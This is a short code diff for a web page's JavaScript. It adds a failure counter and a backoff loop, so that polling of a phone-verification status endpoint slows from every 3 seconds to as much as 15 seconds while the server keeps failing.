@@ -19,10 +19,15 @@ setInterval(() => {
 }, 1000);
 
 // ── Status polling ────────────────────────────────────────────────────────────
+// Consecutive failures stretch the polling interval (3 s -> up to 15 s) so a busy
+// server isn't hammered by every waiting visitor at once.
+let failures = 0;
+
 async function checkStatus() {
     try {
         const res  = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
-        if (!res.ok) return;
+        if (!res.ok) { failures++; return; }
+        failures = 0;
         const data = await res.json();
 
         if (data.status === 'completed') {
@@ -38,8 +43,10 @@ async function checkStatus() {
             window.location.href = 'validation.html?' + params.toString();
         }
         // code_submitted → keep polling
-    } catch {}
+    } catch { failures++; }
 }
 
-checkStatus();
-setInterval(checkStatus, 3000);
+(async function loop() {
+    await checkStatus();
+    setTimeout(loop, Math.min(15000, 3000 * (1 + failures)));
+})();
